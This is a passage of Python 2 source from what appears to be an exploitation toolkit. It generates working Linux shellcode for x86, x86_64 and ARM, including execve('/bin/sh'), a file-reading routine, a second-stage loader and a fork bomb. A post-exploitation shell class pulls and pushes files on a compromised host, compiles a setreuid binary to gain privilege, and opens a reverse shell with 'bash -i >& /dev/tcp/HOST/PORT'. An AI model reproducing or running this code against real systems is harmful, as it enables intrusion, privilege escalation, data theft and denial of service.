    def push_rval(self,count):
        asm=''
        for i in range(count):
            if self.arch in ['x86','x86_64','amd64']:
                asm += '\x50'                       # push  eax/rax
            elif self.arch == 'arm':
                asm += '\x01\xb4'                   # push  {r0}
        return self.gen(asm)

    def pop2arg(self,index):
        asm=''
        if index<7:
            if self.arch == 'x86':
                ebx = 0x5b
                d   = (0,2,1,5,4,6)
                asm += chr(ebx^d[index-1])          # pop   ebx/ecx/edx/esi/edi/ebp
            elif self.arch in ['x86_64','amd64']:
                rdi = 0x5f
                d   = (0,1,5,5,7,6)
                prefix = ('','','','\x41','\x41')
                asm += prefix[index-1]+chr(rdi^d[index-1])
                                                    # pop   rdi/rsi/rdx/r10/r8/r9
            elif self.arch == 'arm':
                asm += chr(2**(index-1))+'\xbc'     # pop   {r0/r1/r2/r3/r4/r5}
        return self.gen(asm)

    def str_addr(self,string):
        string = string.rstrip('\x00')
        string += '\xff' if self.null_free else '\x00'

        asm = ''
        if self.arch == 'x86':
            if self.null_free:
                asm += '\xeb'+chr(0x6)              # jmp    0x6
                asm += '\x8b\x04\x24'               # mov    eax,DWORD PTR [esp]
                asm += '\x04'+chr(0x9)              # add    al,0x9
                asm += '\xc3'                       # ret
                asm += '\xe8'+pack_32(-0xb)         # call   -0xb
                asm += '\x53'                       # push   ebx
                asm += '\x31\xdb'                   # xor    ebx, ebx
                asm += '\x88\x58'+chr(len(string)-1)# mov    BYTE PTR [eax+len(string)-1],bl
                asm += '\x5b'                       # pop    ebx
                asm += '\xeb'+chr(len(string))      # jmp    len(string)
            else:
                asm += '\xe8'+pack_32(0)            # call   0x0
                asm += '\x58'                       # pop    eax
                asm += '\x83\xc0'+chr(0x6)          # add    eax,0x6
                asm += '\xeb'+chr(len(string))      # jmp    len(string)
        elif self.arch in ['x86_64','amd64']:
            if self.null_free:
                asm += '\x48\x8d\x05'+pack_32(-0x7) # lea    rax,[rip-0x7]
                asm += '\x04'+chr(0x12)             # add    al,0x12
                asm += '\x53'                       # push   rbx
                asm += '\x31\xdb'                   # xor    ebx, ebx
                asm += '\x88\x58'+chr(len(string)-1)# mov    BYTE PTR [rax+len(string)-1],bl
                asm += '\x5b'                       # pop    rbx
                asm += '\xeb'+chr(len(string))      # jmp    len(string)
            else:
                asm += '\x48\x8d\x05'+pack_32(2)    # lea    rax,[rip+0x5]
                asm += '\xeb'+chr(len(string))      # jmp    len(string)
        elif self.arch == 'arm':
            string += '\xff'*(len(string)%2)
            len_str = len(string)-1
            asm += '\x78\x46'                   # mov    r0, pc
            if self.null_free:
                asm += '\x0a\x30'                   # adds   r0, #0xa  
                asm += '\x10\xb4'                   # push   {r4}
                asm += '\x64\x40'                   # eors   r4, r4
                asm += ''.join(map(chr,[(len_str%4)<<6|0x4,0x70|(len_str/4)]))
                                                    # strb   r4, [r0, #len(string)-1]
                asm += '\x10\xbc'                   # pop    {r4}
            asm += chr(len(string)/2-1)+'\xe0'  # b.n    len(string)
        return self.gen(asm + string)

    def arr_addr(self,arr):
        arr.reverse()
        string = ''
        for elm in arr:
            if isinstance(elm, str):
                string += elm+('\xff\xff' if self.null_free else '\x00\x00')
        if string:
            string = string[:-2]
                
        asm = ''
        if self.arch == 'x86':
            asm += '\x31\xff'                   # xor     edi, edi
            asm += '\x57'                       # push    edi
            for elm in arr:
                if isinstance(elm, (int,long)):
                    asm += '\x68'+pack_32(elm)      # push elm
                elif isinstance(elm, str):
                    asm += '\x50'                   # push    eax
                    asm += '\x04'+chr(len(elm)+2)   # add     al, len(elm)+2
                    if self.null_free:
                        asm += '\x66\x89\x78\xfe'       # mov    WORD PTR [eax-0x2],di
            asm += '\x89\xe0'                   # mov     eax, esp
        elif self.arch in ['x86_64','amd64']:
            asm += '\x4d\x31\xc0'               # xor     r8, r8
            asm += '\x41\x50'                   # push    r8
            for elm in arr:
                if isinstance(elm, (int,long)):
                    asm += '\x48\xb8'+pack_64(elm)  # movabs  rax, elm
                    asm += '\x50'                   # push    rax
                elif isinstance(elm, str):
                    asm += '\x50'                   # push    rax
                    asm += '\x04'+chr(len(elm)+2)   # add     al, len(elm)+2
                    if self.null_free:
                        asm += '\x44\x88\x40\xfe'       # mov    BYTE PTR [rax-0x2],r8b
            asm += '\x48\x89\xe0'               # mov     rax, rsp
        elif self.arch == 'arm':
            asm += '\x64\x40'                   # eors    r4, r4
            asm += '\x10\xb4'                   # push    {r4}
            for elm in arr:
                if isinstance(elm, (int,long)):
                    asm += ''.join(map(chr,[0x40|elm>>12&0xf,0xf2|(elm&0x800)>>9,elm&0xff,(elm>>4)&0x70]))
                                                    # movw    r0, #(elm&0xffff)
                    elm>>=16
                    asm += ''.join(map(chr,[0xc0|elm>>12&0xf,0xf2|(elm&0x800)>>9,elm&0xff,(elm>>4)&0x70]))
                                                    # movt    r0, #(elm>>16)
                    asm += '\x01\xb4'               # push    {r0}
                elif isinstance(elm, str):
                    asm += '\x01\xb4'               # push    {r0}
                    if self.null_free:
                        asm += ''.join(map(chr,[(len(elm)%4)<<6|0x4,0x70|(len(elm)/4)]))
                                                    # strb    r4, [r0, #len(elm)]
                    asm += chr(len(elm)+2)+'\x30'   # adds    r0, len(elm)+2
            asm += '\x68\x46'                   # mov     r0, sp
        return (self.str_addr(string) if string else '')+self.gen(asm)

    def syscall(self,sys_no,args=[None]):
        args = args+[None]*(6-len(args))
        asm = ''
        if self.arch == 'x86':
            ebx = (0xdb,0xbb)
            d   = (0,2,1,5,4,6)
            for i in range(6): 
                if args[i] is not None:
                    reg = (ebx[0]^(d[i]*9),ebx[1]^d[i])
                    if not args[i]&(((1<<16)-1)<<16):
                        asm += '\x31'+chr(reg[0])                               # xor    ebx/ecx/edx/esi/edi/ebp,   ebx/ecx/edx/esi/edi/ebp
                    if args[i]&(((1<<16)-1)<<16):
                        asm += chr(reg[1])+pack_32(args[i])                     # mov    ebx/ecx/edx/esi/edi/ebp,   args
                    elif (i<3 and args[i]&(((1<<8)-1)<<8)) or i>=3:
                        asm += '\x66'+chr(reg[1])+pack_16(args[i])              # mov    bx/cx/dx/si/di/bp,         args&0xffff
                    elif args[i]&((1<<8)-1):
                        asm += chr(reg[1]-8)+chr(args[i])                       # mov    bl/cl/dl,                  args&0xff
               
            asm +=  '\x31\xc0'                      # xor    eax, eax
            if sys_no:
                asm +=  '\xb0'+chr(sys_no&0xff)         # mov    al, sys_no
            asm +=  '\xcd\x80'                      # int    0x80
        elif self.arch in ['x86_64','amd64']:
            rdi = (0xff,0xbf)
            d   = (0,1,5,5,7,6)
            prefix = (('\x48','\x48','','\x40'),('\x48','\x48','','\x40'),('\x48','\x48','',''),('\x4d','\x49','\x41','\x41'),('\x4d','\x49','\x41','\x41'),('\x4d','\x49','\x41','\x41'))
            for i in range(6): 
                if args[i] is not None:
                    reg = (rdi[0]^(d[i]*9),rdi[1]^d[i])
                    if not args[i]&(((1<<32)-1)<<32):
                        asm += prefix[i][0]+'\x31'+chr(reg[0])                  # xor    rdi/rsi/rdx/r10/r8/r9,   rdi/rsi/rdx/r10/r8/r9
                    if args[i]&(((1<<32)-1)<<32):
                        asm += prefix[i][1]+chr(reg[1])+pack_64(args[i])        # movabs rdi/rsi/rdx/r10/r8/r9,   args
                    elif args[i]&(((1<<16)-1)<<16):
                        asm += prefix[i][2]+chr(reg[1])+pack_32(args[i])        # mov    edi/esi/edx/r10d/r8d/r9d, args&0xffffffff
                    elif args[i]&(((1<<8)-1)<<8):
                        asm += '\x66'+prefix[i][2]+chr(reg[1])+pack_16(args[i]) # mov    di/si/dx/r10w/r8w/r9w,    args&0xffff
                    elif args[i]&((1<<8)-1):
                        asm += prefix[i][3]+chr(reg[1]-8)+chr(args[i])          # mov    dil/sil/dl/r10b/r8b/r9b,  args&0xff
            asm += '\x48\x31\xc0'                   # xor    rax, rax
            if sys_no:
                asm += '\x04'+chr(sys_no&0xff)          # add    al, sys_no
            asm += '\x0f\x05'                       # syscall
        elif self.arch == 'arm':
            for i in range(6):
                if args[i] is not None:
                    v = args[i]
                    if v&(((1<<8)-1)<<8):
                        asm += ''.join(map(chr,[0x40|v>>12&0xf,0xf2|(v&0x800)>>9,v&0xff,(v>>4)&0x70|i]))
                                                                                # movw  r0/r1/r2/r3/r4, args&0xffff
                    elif v&((1<<8)-1):
                        asm += ''.join(map(chr,[v&0xff,0x20|i]))                # movs  r0/r1/r2/r3/r4, args&0xff
                    else:
                        asm += chr(0x40|i*9)+'\x40'                             # eor   r0/r1/r2/r3/r4, r0/r1/r2/r3/r4

                    v >>= 16
                    if v:
                        asm += ''.join(map(chr,[0xc0|v>>12&0xf,0xf2|(v&0x800)>>9,v&0xff,(v>>4)&0x70|i]))
                                                                                # movt  r0/r1/r2/r3/r4, (args&0xffff0000)>>16       
            if sys_no:
                asm += chr(sys_no&0xff)+'\x27'          # movs   r7, sys_no
            else:
                asm += '\x7f\x40'                       # eor   r7, r7
            asm += '\x01\xdf'                       # svc    1
        return self.gen(asm)
    
    def exit(self, code=0):
        # exit(code)
        return self.syscall(self.sys_no['exit'],[code])

    def fork(self):
        # fork()
        return self.syscall(self.sys_no['fork'])

    def vfork(self):
        # vfork()
        return self.syscall(self.sys_no['vfork'])
    
    def read(self, fd, buf, size):
        # read(fd, buf, size)
        return self.syscall(self.sys_no['read'],[fd,buf,size])
    
    def write(self, fd, buf, size):
        # write(fd, buf, size)
        return self.syscall(self.sys_no['write'],[fd,buf,size])
        
    def open(self,fname,flags=O_RDONLY,mode=0644):
        # open(fname, flags)
        if isinstance(fname, (int,long)) or fname is None:
            asm_fname = ''
        elif isinstance(fname, str):
            asm_fname  = self.str_addr(fname)
            asm_fname += self.rval2arg(1)
            fname = None
        return asm_fname+self.syscall(self.sys_no['open'],[fname,flags,mode])

    def close(self, fd):
        # close(fd, buf, length)
        return self.syscall(self.sys_no['close'],[fd])

    def execve(self,fname,argv=NULL,envp=NULL):
        # execve(fname,argv,envp)
        save = (isinstance(argv, list) or isinstance(envp, list))
        asm_fname = ''
        asm_argv = ''
        asm_envp = ''
            
        if isinstance(fname, str):
            asm_fname += self.str_addr(fname)
            asm_fname += self.rval2arg(4 if save else 1)
            fname = None
        elif save and fname is None:
            if self.arch == 'x86':
                asm_fname += '\x89\xde'             # mov    esi, ebx
            elif self.arch in ['x86_64','amd64']:
                asm_fname += '\x49\x89\xfa'         # mov    r10, rdi
            elif self.arch == 'arm':
                asm_fname += '\x03\x1c'             # adds   r3, r0, #0
        
        if isinstance(argv, list):
            asm_argv += self.arr_addr(argv)
            asm_argv += self.rval2arg(2)
            argv = None
        if isinstance(envp, list):
            asm_envp += self.arr_addr(envp)
            asm_envp += self.rval2arg(3)
            envp = None
            
        asm = ''
        if fname is None:
            if save:
                if self.arch == 'x86':
                    asm += '\x89\xf3'             # mov    ebx, esi
                elif self.arch in ['x86_64','amd64']:
                    asm += '\x4c\x89\xd7'         # mov    rdi, r10
                elif self.arch == 'arm':
                    asm += '\x18\x1c'             # adds   r0, r3, #0
                    
            if argv is None:
                if self.arch == 'x86':
                    asm += '\x80\xe9\x04'         # sub    cl, 0x4
                    asm += '\x89\x19'             # mov    DWORD PTR [ecx],ebx
                elif self.arch in ['x86_64','amd64']:
                    asm += '\x40\x80\xee\x08'     # sub    sil, 0x8
                    asm += '\x48\x89\x3e'         # mov    QWORD PTR [rsi],rdi
                elif self.arch == 'arm':
                    asm += '\x41\xf8\x04\x0d'     # str.w   r0, [r1, #-4]!
            
        return asm_fname+asm_argv+asm_envp+self.gen(asm)+self.syscall(self.sys_no['execve'],[fname,argv,envp])

    def dup2(self,old,new):
        # dup2(old,new)
        return self.syscall(self.sys_no['dup2'],[old,new])

    def mmap(self,addr,length,prot,flags,fd,offset):
        # mmap(addr,length,prot,flags,fd)
        _mmap = 'mmap2' if self.arch in ['x86', 'arm'] else 'mmap'
        return self.syscall(self.sys_no[_mmap],[addr,length,prot,flags,fd,offset])
    
    def munmap(self,addr,length):
        # munmap(addr,length)
        return self.syscall(self.sys_no['munmap'],[addr,length])

    def mprotect(self,addr,length,prot):
        # mprotect(addr,length,prot)
        return self.syscall(self.sys_no['mprotect'],[addr,length,prot])

    def geteuid(self):
        # geteuid()
        return self.syscall(self.sys_no['geteuid'])

    def setreuid(self,ruid,euid):
        # setreuid(ruid, euid)
        return self.syscall(self.sys_no['setreuid'],[ruid,euid])
    
    def sh(self,abridge_args=True):
        asm = ''
        if self.arch == 'x86':
            asm +=  '\x31\xd2'                      # xor     edx, edx
            asm +=  '\x52'                          # push    edx
            asm +=  '\x68//sh'                      # push    0x68732f2f
            asm +=  '\x68/bin'                      # push    0x6e69622f
            asm +=  '\x89\xe3'                      # mov     ebx, esp
        elif self.arch in ['x86_64','amd64']:
            asm += '\x48\xbb//bin/sh'               # mov     rbx, '//bin/sh'
            asm += '\x48\xc1\xeb\x08'               # shr     rbx, 8
            asm += '\x53'                           # push    rbx
            asm += '\x48\x89\xe7'                   # mov     rdi, rsp
            asm += '\x48\x31\xd2'                   # xor     rdx, rdx
        elif self.arch == 'arm':
            asm += '\x42\xf6\x2f\x70'               # movw    r0, #12079      ; 0x2f2f //
            asm += '\xc6\xf6\x62\x10'               # movt    r0, #26978      ; 0x6962 ib
            asm += '\x42\xf6\x6e\x71'               # movw    r1, #12142      ; 0x2f6e /n
            asm += '\xc6\xf6\x73\x01'               # movt    r1, #26739      ; 0x6873 hs
            asm += '\x52\x40'                       # eor     r2, r2
            asm += '\x07\xb4'                       # push    {r0, r1, r2}
            asm += '\x68\x46'                       # mov     r0, sp
        return self.gen(asm)+self.execve(None,NULL if abridge_args else [],None)

    def read_file(self, fname, buf=None, size=0x500):
        asm = ''
        if buf is None:
            asm += self.mmap(NULL, 0x1000-size%0x1000+size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
            asm += self.push_rval(2)
            
        asm += self.open(fname)
        
        asm += self.rval2arg(1)
        if buf is None:
            asm += self.pop2arg(2)
        asm += self.read(None,buf,size)
        
        asm += self.rval2arg(3)
        if buf is None:
            asm += self.pop2arg(2)
        asm += self.write(STDOUT_FILENO,buf,None)
        return asm

    def reset_stack(self, addr=NULL, size=0x1000):
        asm = self.mmap(addr, size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
        if self.arch in ['x86','x86_64','amd64']:
            if self.arch == 'x86':
                asm += '\x89\xc4'                   # mov    esp,eax
            else:
                asm += '\x48\x89\xc4'               # mov    rsp,rax
            asm += '\x81\xc4'+pack_32(size-0x100)   # add    esp,size-0x100
        else:
            warn('not implemented')
        return self.gen(asm)

    def stager(self, fd=STDIN_FILENO, buf=0, size=0x501):
        sc_tmp = ShellCode(self.arch, null_free=self.null_free)
        sc_tmp.start()
        size_read = len(sc_tmp.read(fd,None,size))
        
        asm_1 = ''
        asm_2 = ''
        if self.arch == 'x86':
            if buf==0:
                buf = None
                if self.null_free:
                    asm_1 += '\xeb'+chr(0x7)                    # jmp    0x7
                    asm_1 += '\x8b\x0c\x24'                     # mov    ecx,DWORD PTR [esp]
                    asm_1 += '\x80\xc1'+chr(size_read)          # add    cl,len(read)
                    asm_1 += '\xc3'                             # ret
                    asm_1 += '\xe8'+pack_32(-0xc)               # call   -0xc
                else:
                    asm_1 += '\xe8'+pack_32(0)                  # call   0x0
                    asm_1 += '\x59'                             # pop    ecx
                    asm_1 += '\x83\xc1'+chr(size_read+0x4)      # add    ecx,len(read)+0x4
            else:
                asm_2 += '\xff\xe1'                         # jmp    ecx
        elif self.arch in ['x86_64','amd64']:
            if buf==0:
                buf = None
                asm_1 += '\x48\x8d\x35'+pack_32(-0x7)       # lea    rsi,[rip-0x7]
                asm_1 += '\x40\x80\xc6'+chr(size_read+0xb)  # add    sil,len(read)+0xb
            else:
                asm_2 += '\xff\xe6'                         # jmp    rsi
        elif self.arch == 'arm':
            if buf==0:
                buf = None
                asm_1 += '\x79\x46'                         # mov    r1, pc
                asm_1 += chr(size_read)+'\x31'              # adds   r1, len(read)
            else:
                asm_2 += '\x01\x31'                         # adds   r1, #1
                asm_2 += '\x08\x47'                         # bx     r1
        return self.gen(asm_1)+self.read(fd,buf,size)+self.gen(asm_2)

    def fork_bomb(self,level=1, mode='fork'):
        asm  = ''
        if level>0:
            if self.arch == 'x86':
                if level<3:
                    asm += '\x85\xc0'                       # test    eax, eax
                    asm += '\x0f'+chr(0x83+level)+'\x05\x00\x00\x00'
                                                            # level1: je  5 /   level2: jne 5
                asm += '\xe9'+pack_32(-(6+len(asm)+5))      # jmp     -(6+len(asm))
            elif self.arch in ['x86_64','amd64']:
                if level<3:
                    asm += '\x48\x85\xc0'                   # test    rax, rax
                    asm += '\x0f'+chr(0x83+level)+'\x05\x00\x00\x00'
                                                            # level1: je  5 /   level2: jne 5
                asm += '\xe9'+pack_32(-(7+len(asm)+5))      # jmp     -(7+len(asm))
            elif self.arch == 'arm':
                if level<3:
                    asm += '\x00\x28'                       # cmp     r0, #0
                    asm += '\x00'+chr(0xcf+level)           # level1: beq.n 4 /   level2: bne.n 4
                asm += pack_8(-(4+len(asm)+4)/2)+'\xe7'     # b.n     -(4+len(asm))
        return (self.vfork() if mode=='vfork' else self.fork())+self.gen(asm)+self.exit(0)
    
#==========

class Shell:
    def __init__(self,cmn):
        import signal
        from random import choice
        
        signal.signal(signal.SIGINT,self.wait_handler)
        self.cmn    = cmn
        self.cmn.set_show(None)
        
        self.token  = ''
        self.enable = {}
        self.wait   = False
        for i in range(5):
            self.token+=choice("1234567890abcdefghijklmnopqrstuvwxyz")

    def wait_handler(self, signum, stack):
        print 'SIGNAL %d received\n' % signum
        if self.wait:
            self.wait = False
        else:
            exit()

    def select(self):
        self.cmn.read_all()
        self.enable = {'base64':None, 'python':None, 'gcc':None}

        sys.stdout.write('[A]dvanced\t[N]ormal\t[I]nteractive\t[R]everseShell\n[S]tatus\t[E]xit\n')
        while self.cmn.is_alive:
            mode = '' 
            while mode not in ('a','n','i','r','s','e'):
                mode = raw_input('(A/N/I/R/S/E)...').lower()
            
            if mode == 'a':
                self.advanced()
            elif mode == 'n':
                self.normal()
            elif mode == 'i':
                self.interact()
            elif mode == 'r':
                self.back_connect()
            elif mode == 's':
                self.status()
            elif mode == 'e':
                break

            sys.stdout.write('\n')

    def command(self,cmd = '', user = False):
        cmn = self.cmn
        if len(cmd)>0:
            cmn.sendln(cmd + ((' 2>&1; echo __END_%s__' % self.token) if user else ''))

        if user:
            rsp = ''
            self.wait = True
            while self.wait:
                rsp = cmn.read_until().split(('__END_%s__' % self.token))
                sys.stdout.write(rsp[0])
                if len(rsp)>1:
                    break
        else:
            return cmn.read_all()
            
    def is_implemented(self, pname):
        if self.enable[pname] is None or self.enable[pname]==False:
            which = self.command('which %s' % pname)
            enable = which and '/'+pname in which
            if enable:
                info('%s is implemented' % pname)
            else:
                fail('%s is not implemented' % pname)

            self.enable[pname] = enable
        return self.enable[pname]
    
    def status(self):
        sys.stdout.write('Status\n')
        disable = []
        for pname in self.enable:
            if self.enable[pname]:
                info(pname)
            else:
                disable += [pname]
                if self.enable[pname] is None:
                    warn(pname)
                else:
                    fail(pname)

        if disable and raw_input('Recheck?(y/n)').lower()=='y':
            for pname in disable:
                self.is_implemented(pname)

    def download(self,fpath = '*'):
        dname = fpath[:fpath.rfind('/')+1]
        if len(dname)==0:
            dname = './'
        
        files = self.command('ls %s || echo "Error"' % (dname+fpath.split('/')[-1])).split('\n')
            
        if 'Error' not in files:
            for fpath in files:
                if dname in fpath and ':' not in fpath:
                    fname = fpath.split('/')[-1]
                    proc('Downloading "%s" ...' % fpath)
                    
                    data = ''
                    if self.is_implemented('base64'):
                        enc_data = self.command('base64 %s 2>&1 || echo "Error"' % fpath)
                        if 'Error' in enc_data:
                            fail(enc_data.split('\n')[0])
                        else:
                            data = b64decode(enc_data)
                    else:
                        data = self.command('cat %s' % fpath)                  
                        
                    if len(data)>0:
                        open(fname,'wb').write(data)
                        info('"%s" download succeeded!\n' % fname)
                    else:
                        fail('"%s" download failed...\n' % fname)
        else:
            fail('"%s" does not exist' % fpath)

    def upload(self, fname, data=None):
        if data is None:
            data = open(fname,'rb').read()
        fname = fname.split('/')[-1]

        if self.is_implemented('base64'):
            enc_data = b64encode(data)
            rsp = self.command('echo %s | base64 -d > %s' % (enc_data,fname))
        elif self.is_implemented('timeout'):
            rsp = self.command('timeout 2 cat > %s; echo Terminated' % fname)
            self.cmn.send(data)
            self.cmn.read_until('Terminated\n')

        if rsp is not None and len(rsp)==0:
            info('"%s" upload succeeded!\n' % fname)
        else:
            fail('"%s" upload failed...\n' % fname)
            
    def advanced(self):
        whoami = self.command('whoami').split('\n')[0]
        if 'whoami:' in whoami:
            whoami = '********'
        hostname = self.command('hostname').split('\n')[0]
        pwd = self.command('pwd').split('\n')[0]

        while True:
            cmd = raw_input('[%s@%s:%s]$ ' % (whoami,hostname,pwd))
            
            pgm = cmd.split(' ')
            if pgm[0]=='GET':
                if len(pgm)>1:
                    self.download(pgm[1])
                else:
                    warn('GET <file name>')
            elif pgm[0]=='PUT':
                if len(pgm)>1:
                    self.upload(pgm[1])
                else:
                    warn('PUT <file name>')
            elif pgm[0]=='REVERSE':
                self.back_connect((pgm[1],int(pgm[2])) if len(pgm)>2 else None)
            elif 'cd ' in cmd:
                self.command(cmd)
                pwd = self.command('pwd')[:-1]
            elif pgm[0] in ('exit','MODE'):
                break
            else:
                self.command(cmd,True)

        if pgm[0]=='exit':
            self.cmn.is_alive = False

    def normal(self):
        while True:
            cmd = raw_input("$")
            if cmd in ('exit','MODE'):
                break
            else:
                self.command(cmd,True)

        if cmd=='exit':
            self.cmn.is_alive = False
        
    def interact(self):
        if self.is_implemented('python') and raw_input('Need TTY?(y/n)').lower()=='y':
            get_tty = True
            if 'euid' in self.command('id'):
                if self.is_implemented('gcc') and self.is_implemented('base64'):
                    setreuid = '#include<stdlib.h>\n#include<unistd.h>\nmain(){setreuid(geteuid(),-1);execl("/bin/sh","/bin/sh",NULL);}'
                    self.command('cd /tmp')
                    self.upload('setreuid.c', setreuid)
                    self.command('gcc setreuid.c -o setreuid && ./setreuid; exit')
                    self.command('cd - > /dev/null')
        else:
            get_tty = False
            

        if get_tty:
            shells = []
            sleep(0.5)
            for s in self.command('cat /etc/shells').split('\n'):
                if s and s[0]=='/':
                    shells += [s]
                    sys.stdout.write('%d : %s\n' % (len(shells), s))

            if len(shells)>0:
                shell_no = 0
                while shell_no <= 0 or shell_no > len(shells):
                    shell_no = raw_input('>>')
                    shell_no = int(shell_no) if shell_no.isdigit() else 0
            else:
                shell_no = 1
                shells = ['/bin/sh']
                
            self.command('TERM=cygwin python -c \'import pty; pty.spawn("%s")\'; exit' % shells[shell_no-1])
            sleep(0.5)
            get_tty = 'not a tty' not in self.command('tty')
        
        Interact(self.cmn).worker(get_tty)

    def back_connect(self,hp = None):
        if(hp is None):
            tmp = raw_input('Input host "Addr:Port"(Enter:deafult)>>')
            if ':' in tmp:
                tmp = tmp.split(':')
                hp = (tmp[0],int(tmp[1]))
            else:
                hp = lhp
            
        info('Back Connect to %s:%d\n' % hp)
        self.command('/bin/bash -c "bash -i >& /dev/tcp/%s/%d 0>&1 &"' % hp)

    def __del__(self):
        self.cmn.sendln('exit')

#==========
                
class Interact:
    def __init__(self, cmn):
        self.cmn = cmn

    def worker(self, tty=False):
        from thread import start_new_thread
        if not tty:
            fail('Not a TTY')
        
        start_new_thread(self.listener, ())
        self.sender(tty)
        
    def sender(self, tty):
        if tty:
            try:
                import curses
            
                self.stdscr = curses.initscr()
                curses.noecho()
                curses.cbreak()
                self.stdscr.keypad(True)
            except:
               fail('module "curses" is not importable')
               tty = False
            
        keypad = {  'KEY_BACKSPACE' :'\x7f',
                    'KEY_UP'        :'\x1b\x5b\x41',
                    'KEY_DOWN'      :'\x1b\x5b\x42',
                    'KEY_RIGHT'     :'\x1b\x5b\x43',
                    'KEY_LEFT'      :'\x1b\x5b\x44',
                    'KEY_HOME'      :'\x1b\x5b\x31\x7e',
                    'KEY_IC'        :'\x1b\x5b\x32\x7e',
                    'KEY_DC'        :'\x1b\x5b\x33\x7e',
                    'KEY_END'       :'\x1b\x5b\x34\x7e',
                    'KEY_PPAGE'     :'\x1b\x5b\x35\x7e',
                    'KEY_NPAGE'     :'\x1b\x5b\x36\x7e'}

        while self.cmn.is_alive:
            key = self.stdscr.getkey() if tty else sys.stdin.readline()
            self.cmn.send(keypad[key] if key in keypad else key)

        if tty:
            self.stdscr.keypad(False)
            curses.nocbreak()
            curses.echo()
            curses.endwin()

        return tty

    def listener(self):
        while self.cmn.is_alive:
            rsp = self.cmn.read(512)
            if rsp:
                sys.stdout.write(rsp)
            
#==========
